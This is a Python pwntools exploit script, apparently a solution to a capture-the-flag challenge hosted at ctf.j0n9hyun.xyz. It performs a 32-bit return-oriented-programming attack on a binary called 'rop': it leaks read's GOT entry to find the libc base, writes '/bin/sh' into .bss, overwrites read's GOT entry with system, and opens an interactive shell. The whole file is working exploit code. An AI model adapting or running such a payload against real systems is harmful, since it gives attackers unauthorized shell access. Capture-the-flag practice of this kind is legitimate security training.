from pwn import *
 
context.log_level="debug"
 
p = remote('ctf.j0n9hyun.xyz', 3021)
e = ELF('./rop') # find plt, got
libc = ELF('./libc.so.6') # find offset

write_plt = e.plt['write']
read_plt = e.plt['read']
read_got = e.got['read']

read_off = libc.symbols['read']
system_off = libc.symbols['system']

bss = e.bss()

binsh = "/bin/sh\x00"

pppr = 0x08048509

# 1 stage1
payload = "A"*(0x88+4)
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

# 2 bss
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(len(binsh))

# 3 GOT overwrite
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(read_got)
payload += p32(4)

# 4 system()
payload += p32(read_plt)
payload += "AAAA"
payload += p32(bss)

# exploit
p.sendline(payload)

read_addr = u32(p.recv(4)) # 1
libc_addr = read_addr - read_off 
system_addr = libc_addr + system_off # stage1 end
p.send(binsh) # 2
p.sendline(p32(system_addr)) # 3
p.interactive()